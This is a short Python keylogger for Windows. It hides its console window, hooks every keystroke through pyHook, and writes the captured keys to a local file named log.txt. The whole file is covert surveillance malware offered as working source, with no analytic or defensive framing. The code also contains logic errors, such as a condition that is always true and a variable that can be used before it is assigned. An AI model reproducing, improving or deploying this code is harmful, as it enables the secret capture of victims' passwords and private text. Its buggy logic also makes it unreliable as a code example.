import pyHook, pythoncom
import win32console, win32gui

win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)

def OnKeybordEvent(event):
    if event.Ascii == 5:
        exit(1)
    if event.Ascii != 0 or 8:
        f = open('log.txt', 'r')
        buffer = f.read()
        f.close()
        f = open('log.txt', 'w')
        keylogs = chr(event.Ascii)
    if event.Ascii == 13:
        keylogs = '\n'
    buffer += keylogs
    f.write(buffer)
    f.close()

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeybordEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()
